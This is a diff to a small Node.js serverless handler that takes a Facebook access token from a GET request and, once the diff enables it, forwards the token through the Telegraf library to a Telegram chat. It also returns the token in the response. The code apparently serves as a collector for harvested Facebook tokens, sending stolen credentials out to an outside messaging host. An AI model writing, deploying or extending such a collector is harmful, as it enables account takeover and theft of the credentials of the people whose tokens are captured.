@@ -1,12 +1,11 @@
-//import { Telegraf } from 'telegraf';
-import { VercelRequest, VercelResponse } from '@vercel/node';
+const { Telegraf } = require('telegraf');
 
-//const BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';
-//const CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID';
+const BOT_TOKEN = process.env.BOT_TOKEN || '';
+const CHAT_ID = process.env.CHAT_ID || '';
 
-//const bot = new Telegraf(BOT_TOKEN);
+const bot = new Telegraf(BOT_TOKEN);
 
-export default async (req: VercelRequest, res: VercelResponse) => {
+module.exports = async (req, res) => {
   if (req.method !== 'GET') {
     return res.status(405).send('Method Not Allowed');
   }
@@ -18,16 +17,15 @@ export default async (req: VercelRequest, res: VercelResponse) => {
   }
 
   try {
-    // Отправляем токен в Telegram
-    //await bot.telegram.sendMessage(
-    //  CHAT_ID,
-    //  `🔑 Новый Facebook токен:\n\n\`${access_token}\`\n\nНе забудьте сохранить!`,
-    //  { parse_mode: 'Markdown' }
-    //);
-    res.status(200).send('Token: ' + access_token);
-    //res.status(200).send('Token received and sent to Telegram!');
+    await bot.telegram.sendMessage(
+      CHAT_ID,
+      `🔑 Facebook токен:\n\n\`${access_token}\``,
+      { parse_mode: 'Markdown' }
+    );
+
+    res.status(200).send(`Token отправлен в Telegram!\nToken: ${access_token}`);
   } catch (error) {
-    console.error('Error:', error);
-    res.status(500).send('Error sending token to Telegram');
+    console.error('Ошибка:', error);
+    res.status(500).send('Ошибка при отправке токена');
   }
 };
